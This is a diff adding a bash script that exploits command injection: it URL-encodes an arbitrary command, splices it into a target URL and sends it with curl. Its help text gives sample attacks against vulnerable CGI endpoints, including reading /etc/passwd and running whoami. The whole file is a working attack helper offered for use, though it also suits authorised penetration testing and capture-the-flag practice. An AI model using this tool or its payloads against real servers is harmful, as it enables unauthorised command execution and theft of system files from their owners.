@@ -1,0 +1,99 @@
+#!/bin/bash
+#
+# cmd - A utility for sending commands to a web server with command injection
+#
+# This script URL-encodes a command and sends it to a specified URL,
+# useful for testing and exploiting command injection vulnerabilities.
+
+# Function to display help information
+function show_help() {
+    cat << EOF
+Usage: cmd [OPTIONS] <URL> <COMMAND> [CURL_OPTIONS]
+
+Description:
+    Send commands to a URL endpoint, typically for command injection testing.
+    The command is automatically URL-encoded before being sent.
+
+Options:
+    -h, --help      Display this help message and exit
+    -v, --verbose   Enable verbose output (shows the full curl command)
+
+Arguments:
+    URL             The target URL where command will be injected
+                    (use \${CMD} in the URL to specify where the command should be inserted)
+    COMMAND         The command to execute on the target
+    CURL_OPTIONS    Additional options to pass to curl (optional)
+
+Examples:
+    cmd http://example.com/cgi-bin/vuln.cgi?cmd= "ls -la"
+    cmd "http://example.com/cgi-bin/vuln.cgi?param=\${CMD}" "cat /etc/passwd" "-H 'Cookie: session=1234'"
+    cmd -v http://example.com/cgi-bin/vuln.cgi?cmd= "whoami"
+
+EOF
+    exit 0
+}
+
+# Function to URL encode a string
+function url_encode() {
+    python3 -c "import urllib.parse; print(urllib.parse.quote('''$1'''))"
+}
+
+# Check if urlencode command exists, otherwise use our function
+if ! command -v urlencode &> /dev/null; then
+    urlencode() {
+        url_encode "$1"
+    }
+fi
+
+# Default settings
+VERBOSE=false
+
+# Parse options
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -h|--help)
+            show_help
+            ;;
+        -v|--verbose)
+            VERBOSE=true
+            shift
+            ;;
+        *)
+            break
+            ;;
+    esac
+done
+
+# Check for required arguments
+if [ $# -lt 2 ]; then
+    echo "Error: Missing required arguments."
+    echo "Use 'cmd --help' for usage information."
+    exit 1
+fi
+
+url="$1"
+command="$2"
+curl_options="${3:-}"
+# Split the caller's option string into separate words, the way an unquoted
+# expansion used to. An empty string yields an empty array, so curl never
+# receives a stray empty argument.
+read -ra curl_opts <<< "$curl_options"
+
+# URL-encode the command
+encoded_cmd=$(urlencode "$command")
+
+# If URL contains ${CMD} placeholder, replace it with the encoded command
+# shellcheck disable=SC2016  # ${CMD} is a literal placeholder, not an expansion
+if [[ "$url" == *'${CMD}'* ]]; then
+    final_url="${url/\${CMD}/$encoded_cmd}"
+else
+    # Otherwise append the encoded command to the URL
+    final_url="${url}${encoded_cmd}"
+fi
+
+# Execute the curl command
+if [ "$VERBOSE" = true ]; then
+    echo "Executing: curl $curl_options \"$final_url\" --output -"
+fi
+
+curl "${curl_opts[@]}" "$final_url" --output -
